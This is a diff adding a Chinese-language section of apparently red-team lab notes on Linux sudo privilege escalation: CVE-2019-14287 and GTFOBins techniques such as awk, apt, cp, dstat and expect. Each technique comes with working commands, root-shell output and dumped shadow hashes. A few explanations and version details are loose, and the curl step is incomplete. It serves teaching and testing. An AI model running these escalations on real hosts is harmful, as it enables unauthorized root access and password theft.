@@ -1887,3 +1887,596 @@ permit nopass enil as root cmd reboot
 ```
 
 这个规则允许用户 enil 不需要密码作为 root 用户允许 reboot 命令。
+
+### CVE-2019-14287
+
+CVE-2019-14287 是一种在 Unix Sudo 程序中发现的漏洞，由苹果公司的一位研究员 Joe Vennix 发现。
+
+sudo 允许以其他用户身份执行程序。通常默认为 root，但可以通过指定用户名和 UID，也可以以其他用户身份执行程序。例如，通常可以这样使用 `sudo <command>`，但可以手动选择以其他用户执行，例如：`sudo -u#<id> <command>`。这意味着执行选定的命令时可以伪装为另一个用户，这可能可以获得比原本拥有更高的权限。
+
+这个漏洞影响了 sudo 版本在 1.8.28 的系统，这个漏洞在 1.8.28p1 版本中被修复。
+
+查看 sudo 权限以及 sudo 版本。
+
+```bash
+user@RedteamNotes:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/rvim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+    (root) NOPASSWD: /usr/sbin/tcpdump
+    (root) NOPASSWD: /usr/bin/exiftool
+    (ALL, !root) NOPASSWD: /bin/bash
+user@RedteamNotes:~$ sudo -V
+Sudo version 1.7.4p4
+```
+
+发现 sudo 版本小于 1.8.28，直接利用。
+
+```bash
+user@RedteamNotes:~$ sudo -u#-1 /bin/bash
+root@RedteamNotes:/home/user# whoami
+root
+```
+
+下面是一些解释。
+
+```bash
+(ALL, !root) NOPASSWD: /bin/bash
+```
+
+这将允许用户以另一个用户的身份执行任何命令，但理论上会阻止以超级用户的身份执行命令。如果指定 UID 为 -1，sudo 则会错误的将其读取为 0。这意味着指定 UID 为 -1 或 4294967295 时将以 sudo 身份执行命令。
+
+### sudo apt
+
+从此条开始下面数个提权演示命令参考 [GTFOBins](https://gtfobins.github.io)
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/apt
+```
+
+发现可以无需密码执行 `/usr/bin/apt` 命令，执行提权命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash
+root@RedteamNotes:/tmp# whoami
+root
+```
+
+解释一下命令。
+
+```bash
+sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash
+```
+
+这是一个 apt 命令的选项，用于设置在运行 apt update 之前执行的预处理脚本。`::` 类似于名字空间，逐级访问子配置。
+
+### sudo apache2
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+user@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User user may run the following commands on localhost:
+    (root) NOPASSWD: /usr/sbin/apache2
+```
+
+发现可以无需密码执行 `/usr/sbin/apache2` 命令，使用该命令读取 `/etc/shadow` 文件。
+
+```bash
+user@RedteamNotes:~$ sudo apache2 -f /etc/shadow
+Syntax error on line 1 of /etc/shadow:
+Invalid command 'root:$6$1jXHC49QenfimFS4$ncBkl6H.3JA9N2ZoTHCpu4g68lTPlX0RFYiFEkHA8I3.AgWcKiL0mtrUiC5Ue87TP8eIEWDe/Dij4hP5gb/Gm0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
+```
+
+可以看到获取了 root 的 shadow 文件，后续可参考本文章前段的可读 shadow 文件提权演示。
+
+一些应用程序可能没有已知漏洞，比如最新的 Apache2 服务器程序，常规功能不能被巧用。但 Apache2 帮助信息提示它有一个支持加载替代配置文件的选项 -f，指定代替 ServerConfigFile，指定此选项加载 /etc/shadow 文件将产生一条此错误信息，包含 /etc/shadow 文件的第一行数据。
+
+### sudo ash
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/ash
+```
+
+发现可以无需密码执行 `/usr/bin/ash` 命令，执行提权命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo /usr/bin/ash
+# whoami
+root
+```
+
+ash 是 Bourne shell（sh）的一个轻量级版本，它消耗的系统资源更少，通常用于嵌入式系统和资源有限的环境。
+
+不管什么 shell，只要是 shell 的直接以 sudo 执行肯定可以提权。
+
+### sudo awk
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/awk
+```
+
+发现可以无需密码执行 `/usr/bin/awk` 命令，运行提权命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo /usr/bin/awk 'BEGIN {system("/bin/bash")}'
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+
+下面是一些解释。
+
+```bash
+sudo /usr/bin/awk 'BEGIN {system("/bin/bash")}'
+```
+
+`'BEGIN {system("/bin/bash")}` 是 `awk` 的语法，是传递给 awk 的脚本。`BEGIN` 是 `awk` 的一个特殊模式，表示在处理任何输入行之前执行的动作。在这个命令中，`BEGIN` 块的唯一动作是调用 `system` 函数。`system` 函数用于在 `awk` 内部执行 `shell` 命令，启动一个新的 `bash` 会话。
+
+### sudo base64
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/base64
+```
+
+发现可以无需密码执行 `/usr/bin/base64` 命令，运行命令查看 shadow 文件。
+
+```bash
+jackie@RedteamNotes:~$ sudo /usr/bin/base64 /etc/shadow | base64 --decode
+root:$y$j9T$a.ipD.LiSZYLHLRH7lSKk.$zxqmHjNW491.v7cru/aqsM6HRRaZElH43FW0EuNyqjC:20470:0:99999:7:::
+daemon:*:19405:0:99999:7:::
+bin:*:19405:0:99999:7:::
+sys:*:19405:0:99999:7:::
+sync:*:19405:0:99999:7:::
+games:*:19405:0:99999:7:::
+man:*:19405:0:99999:7:::
+lp:*:19405:0:99999:7:::
+mail:*:19405:0:99999:7:::
+news:*:19405:0:99999:7:::
+uucp:*:19405:0:99999:7:::
+proxy:*:19405:0:99999:7:::
+www-data:*:19405:0:99999:7:::
+backup:*:19405:0:99999:7:::
+list:*:19405:0:99999:7:::
+irc:*:19405:0:99999:7:::
+gnats:*:19405:0:99999:7:::
+nobody:*:19405:0:99999:7:::
+_apt:*:19405:0:99999:7:::
+systemd-network:*:19405:0:99999:7:::
+systemd-resolve:*:19405:0:99999:7:::
+messagebus:*:19405:0:99999:7:::
+systemd-timesync:*:19405:0:99999:7:::
+pollinate:*:19405:0:99999:7:::
+sshd:*:19405:0:99999:7:::
+syslog:*:19405:0:99999:7:::
+uuidd:*:19405:0:99999:7:::
+tcpdump:*:19405:0:99999:7:::
+tss:*:19405:0:99999:7:::
+landscape:*:19405:0:99999:7:::
+fwupd-refresh:*:19405:0:99999:7:::
+usbmux:*:19467:0:99999:7:::
+jack:$6$AQNi8FXirbH0UTEj$qFvuV86Nt0rLBUIIzD7lNwBsXAs0Pe.RkeGCdL6WAx7F/dnpMNlWnbtaxrGWLnFriYIssY2APvQoSuaPvHEkc.:19467:0:99999:7:::
+lxd:!:19467::::::
+jackie:$y$j9T$HGogdG4n7G1yXJqpQGvoS/$In6/ABIDki2EGI5fEDDVdWNaVBpoBqWE.mpRK45htg1:19495:0:99999:7:::
+mysql:!:19494:0:99999:7:::
+```
+
+后续可参考本文章前段的可读 shadow 文件提权演示。
+
+`base32`、`base58`、`basenc`、`basez` 等都可以用相同的方法查看文件。
+
+### sudo bash
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/bash
+```
+
+发现可以无需密码执行 `/usr/bin/bash` 命令，直接执行 `bash` 获得 `root`。
+
+```bash
+jackie@RedteamNotes:~$ sudo /bin/bash
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+包括之前演示的 `ash` 与这个 `bash`，下面这些几乎都可以用相同的语法实现提权，因为它们本身就是 `shell`。
+
+- /usr/bin/csh
+- /usr/bin/dash
+- /usr/bin/sh
+- /usr/bin/tclsh
+- /usr/bin/zsh
+- ...
+
+### sudo cp
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/cp
+```
+
+发现可以无需密码执行 `/usr/bin/cp` 命令，可以使用 `cp` 命令修改 `root` 密码。
+
+注意，这么会损伤服务器，谨慎考虑后再执行下一步。
+
+在 kali 中制作要替换的密码。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ mkpasswd -m sha-512 enilmalus
+$6$nQHYWwH9eo7g6qhZ$DsS9e3.NKKTbljgMeZpwApqCsEjpKazz/cXmfGKiB17z3pTO/FumI3iXLER1gi3OW7HV7oq0SLhcVb7jqJQm.0
+```
+
+在靶机中：
+
+```bash
+jackie@RedteamNotes:~$ Enilmalus=/etc/shadow
+jackie@RedteamNotes:~$ TF=$(mktemp)
+jackie@RedteamNotes:~$ echo 'root:$6$nQHYWwH9eo7g6qhZ$DsS9e3.NKKTbljgMeZpwApqCsEjpKazz/cXmfGKiB17z3pTO/FumI3iXLER1gi3OW7HV7oq0SLhcVb7jqJQm.0:19495:0:99999:7:::' > $TF
+jackie@RedteamNotes:~$ echo $TF
+/tmp/tmp.xQTrcAWIQr
+jackie@RedteamNotes:~$ cat /tmp/tmp.xQTrcAWIQr
+root:$6$nQHYWwH9eo7g6qhZ$DsS9e3.NKKTbljgMeZpwApqCsEjpKazz/cXmfGKiB17z3pTO/FumI3iXLER1gi3OW7HV7oq0SLhcVb7jqJQm.0:19495:0:99999:7:::
+jackie@RedteamNotes:~$ sudo cp $TF $Enilmalus
+```
+
+使用制作的密码登入。
+
+```bash
+jackie@RedteamNotes:~$ su root
+Password: 
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+`TF=$(mktemp)` 做临时文件赋值给 TF，这种做临时文件的方式是专业做法，是最佳实践，从安全和边界角度考虑的，TF 可以根据需要自主命名。
+
+### sudo cpulimit
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/cpulimit
+```
+
+发现可以无需密码执行 `/usr/bin/cpulimit` 命令，执行提权命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo cpulimit -l 100 -f /bin/bash
+Process 3022 detected
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+`cpulimit` 是一个工具，用于限制进程的 CPU 使用率。 `-l` 参数后面跟的是百分比，这里的 `100` 意味着限制 `CPU` 的使用率为 100%。
+
+`-f` 参数指定需要限制 `CPU` 使用率的命令或程序，指定为 `/bin/bash`。
+
+这个命令以 sudo 权限限制 `/bin/bash` 命令的 `CPU` 使用率不超过 100%。随后按这个标准启动进程，所以获得了提权。
+
+### sudo curl
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/curl
+```
+
+发现可以无需密码执行 `/usr/bin/curl` 命令，可以使用 `curl` 写入文件。
+
+注意，这种方式提权可能会损伤服务器，请深思熟虑后再进行。
+
+在 kali 中制作要替换的密码。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ mkpasswd -m sha-512 enilmalus
+$6$nQHYWwH9eo7g6qhZ$DsS9e3.NKKTbljgMeZpwApqCsEjpKazz/cXmfGKiB17z3pTO/FumI3iXLER1gi3OW7HV7oq0SLhcVb7jqJQm.0
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ vim shadow1
+                                                                                                        
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ cat shadow1 
+root:$6$nQHYWwH9eo7g6qhZ$DsS9e3.NKKTbljgMeZpwApqCsEjpKazz/cXmfGKiB17z3pTO/FumI3iXLER1gi3OW7HV7oq0SLhcVb7jqJQm.0:17298:0:99999:7:::
+```
+
+启动简易服务器。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ sudo php -S 0:80
+[sudo] password for kali: 
+[Sat Jan 17 05:56:03 2026] PHP 8.4.8 Development Server (http://0:80) started
+[Sat Jan 17 05:57:53 2026] 10.10.10.68:34332 Accepted
+[Sat Jan 17 05:57:53 2026] 10.10.10.68:34332 [200]: GET /shadow1
+[Sat Jan 17 05:57:53 2026] 10.10.10.68:34332 Closing
+
+```
+
+在把靶机中实现提权。
+
+```bash
+jackie@RedteamNotes:~$ su root
+Password: 
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+### sudo date
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/date
+```
+
+发现可以无需密码执行 `/usr/bin/date` 命令，使用 `date` 查看 `/etc/shadow` 文件。
+
+```bash
+jackie@RedteamNotes:~$ sudo date -f /etc/shadow
+date: invalid date ‘root:$6$1mokVIOR1y0hKn2n$.ImQujW12YEC4sMF7IQcUQmLStAQHuByyNhVIiEzvF/SQx3nBMPBFi4xQ40sp80V6ivaJEAy/0n23TsTi.AnO.:19495:0:99999:7:::’
+date: invalid date ‘daemon:*:19405:0:99999:7:::’
+date: invalid date ‘bin:*:19405:0:99999:7:::’
+date: invalid date ‘sys:*:19405:0:99999:7:::’
+date: invalid date ‘sync:*:19405:0:99999:7:::’
+date: invalid date ‘games:*:19405:0:99999:7:::’
+date: invalid date ‘man:*:19405:0:99999:7:::’
+date: invalid date ‘lp:*:19405:0:99999:7:::’
+date: invalid date ‘mail:*:19405:0:99999:7:::’
+date: invalid date ‘news:*:19405:0:99999:7:::’
+date: invalid date ‘uucp:*:19405:0:99999:7:::’
+date: invalid date ‘proxy:*:19405:0:99999:7:::’
+date: invalid date ‘www-data:*:19405:0:99999:7:::’
+date: invalid date ‘backup:*:19405:0:99999:7:::’
+date: invalid date ‘list:*:19405:0:99999:7:::’
+date: invalid date ‘irc:*:19405:0:99999:7:::’
+date: invalid date ‘gnats:*:19405:0:99999:7:::’
+date: invalid date ‘nobody:*:19405:0:99999:7:::’
+date: invalid date ‘_apt:*:19405:0:99999:7:::’
+date: invalid date ‘systemd-network:*:19405:0:99999:7:::’
+date: invalid date ‘systemd-resolve:*:19405:0:99999:7:::’
+date: invalid date ‘messagebus:*:19405:0:99999:7:::’
+date: invalid date ‘systemd-timesync:*:19405:0:99999:7:::’
+date: invalid date ‘pollinate:*:19405:0:99999:7:::’
+date: invalid date ‘sshd:*:19405:0:99999:7:::’
+date: invalid date ‘syslog:*:19405:0:99999:7:::’
+date: invalid date ‘uuidd:*:19405:0:99999:7:::’
+date: invalid date ‘tcpdump:*:19405:0:99999:7:::’
+date: invalid date ‘tss:*:19405:0:99999:7:::’
+date: invalid date ‘landscape:*:19405:0:99999:7:::’
+date: invalid date ‘fwupd-refresh:*:19405:0:99999:7:::’
+date: invalid date ‘usbmux:*:19467:0:99999:7:::’
+date: invalid date ‘jack:$6$AQNi8FXirbH0UTEj$qFvuV86Nt0rLBUIIzD7lNwBsXAs0Pe.RkeGCdL6WAx7F/dnpMNlWnbtaxrGWLnFriYIssY2APvQoSuaPvHEkc.:19467:0:99999:7:::’
+date: invalid date ‘lxd:!:19467::::::’
+date: invalid date ‘jackie:$y$j9T$HGogdG4n7G1yXJqpQGvoS/$In6/ABIDki2EGI5fEDDVdWNaVBpoBqWE.mpRK45htg1:19495:0:99999:7:::’
+date: invalid date ‘mysql:!:19494:0:99999:7:::’
+```
+
+后续可参考本文章前段的可读 shadow 文件提权演示。
+
+`-f` 参数允许 `date` 从给定的文件中读取日期和时间。这个文件应包含一行或多行日期和时间信息。虽然报错 `/etc/shadow` 文件却被显示出来。
+
+### sudo dstat
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/dstat
+```
+
+发现可以无需密码执行 `/usr/bin/dstat` 命令，找到插件目录，按照格式攥写利用功能的插件。
+
+```bash
+jackie@RedteamNotes:~$ find / -name dstat -type d 2>/dev/null
+/usr/share/doc/dstat
+/usr/share/dstat
+jackie@RedteamNotes:~$ ls /usr/share/dstat
+dstat_battery.py         dstat_jvm_full.py             dstat_nfsstat4.py       dstat_top_cpu.py
+dstat_battery_remain.py  dstat_jvm_vm.py               dstat_ntp.py            dstat_top_cputime_avg.py
+dstat_condor_queue.py    dstat_lustre.py               dstat_postfix.py        dstat_top_cputime.py
+dstat_cpufreq.py         dstat_md_status.py            dstat_power.py          dstat_top_int.py
+dstat_dbus.py            dstat_memcache_hits.py        dstat_proc_count.py     dstat_top_io_adv.py
+dstat_disk_avgqu.py      dstat_mongodb_conn.py         dstat.py                dstat_top_io.py
+dstat_disk_avgrq.py      dstat_mongodb_mem.py          dstat_qmail.py          dstat_top_latency_avg.py
+dstat_disk_svctm.py      dstat_mongodb_opcount.py      dstat_redis.py          dstat_top_latency.py
+dstat_disk_tps.py        dstat_mongodb_queue.py        dstat_rpcd.py           dstat_top_mem.py
+dstat_disk_util.py       dstat_mongodb_stats.py        dstat_rpc.py            dstat_top_oom.py
+dstat_disk_wait.py       dstat_mysql5_cmds.py          dstat_sendmail.py       dstat_utmp.py
+dstat_dstat_cpu.py       dstat_mysql5_conn.py          dstat_snmp_cpu.py       dstat_vm_cpu.py
+dstat_dstat_ctxt.py      dstat_mysql5_innodb_basic.py  dstat_snmp_load.py      dstat_vmk_hba.py
+dstat_dstat_mem.py       dstat_mysql5_innodb_extra.py  dstat_snmp_mem.py       dstat_vmk_int.py
+dstat_dstat.py           dstat_mysql5_innodb.py        dstat_snmp_net_err.py   dstat_vmk_nic.py
+dstat_fan.py             dstat_mysql5_io.py            dstat_snmp_net.py       dstat_vm_mem_adv.py
+dstat_freespace.py       dstat_mysql5_keys.py          dstat_snmp_sys.py       dstat_vm_mem.py
+dstat_fuse.py            dstat_mysql_io.py             dstat_snooze.py         dstat_vz_cpu.py
+dstat_gpfs_ops.py        dstat_mysql_keys.py           dstat_squid.py          dstat_vz_io.py
+dstat_gpfs.py            dstat_net_packets.py          dstat_test.py           dstat_vz_ubc.py
+dstat_helloworld.py      dstat_nfs3_ops.py             dstat_thermal.py        dstat_wifi.py
+dstat_ib.py              dstat_nfs3.py                 dstat_top_bio_adv.py    dstat_zfs_arc.py
+dstat_innodb_buffer.py   dstat_nfsd3_ops.py            dstat_top_bio.py        dstat_zfs_l2arc.py
+dstat_innodb_io.py       dstat_nfsd3.py                dstat_top_childwait.py  dstat_zfs_zil.py
+dstat_innodb_ops.py      dstat_nfsd4_ops.py            dstat_top_cpu_adv.py    __pycache__
+```
+
+攥写恶意脚本并利用。
+
+```bash
+jackie@RedteamNotes:~$ vim dstat_exploit.py
+jackie@RedteamNotes:~$ cat dstat_exploit.py 
+import os; os.execv("/bin/bash", ["bash"])
+jackie@RedteamNotes:~$ mv dstat_exploit.py /usr/share/dstat/dstat_exploit.py
+jackie@RedteamNotes:~$ ls -liah /usr/share/dstat/dstat_exploit.py 
+524657 -rw-rw-r-- 1 jackie jackie 43 Jan 17 14:52 /usr/share/dstat/dstat_exploit.py
+jackie@RedteamNotes:~$ sudo dstat --exploit
+/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib and slated for removal in Python 3.12; see the module's documentation for alternative uses
+  import imp
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+`dstat` 是一个用于系统监控和诊断的工具，它提供了实时的性能统计数据和系统资源使用情况。通过使用 `dstat` 命令可以获得有关 CPU、内存、磁盘、网络等方面的详细信息。
+
+### sudo ed
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/ed
+```
+
+发现可以无需密码执行 `/usr/bin/ed` 命令，执行提权命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo ed
+!/bin/bash
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+`ed` 是一个编辑器，一个基于行的文本编辑器，它被设计成在终端中进行操作，并且没有图形用户界面。
+
+`!/bin/bash` 是在 `ed` 编辑器中输入的命令。这个命令告诉 `ed` 执行一个外部的 `shell` 脚本。
+
+### sudo env
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/env
+```
+
+发现可以无需密码执行 `/usr/bin/env` 命令，执行提权命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo env /bin/bash
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+`env` 通常用于设置和显示环境变量的值。在本利用中，`env` 命令用于在指定环境下执行后面的命令。
+
+### sudo expect
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/expect
+```
+
+发现可以无需密码执行 `/usr/bin/expect` 命令，执行提权命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo expect -c 'spawn /bin/bash;interact'
+spawn /bin/bash
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+`expect` 能模拟用户的键盘输入，恶意命令以 `root` 身份在新的 `shell` 进程中开启了一个交互式会话。`-c` 允许在命令行中输入 `expect` 脚本代码，而不是从文件中读取。
+
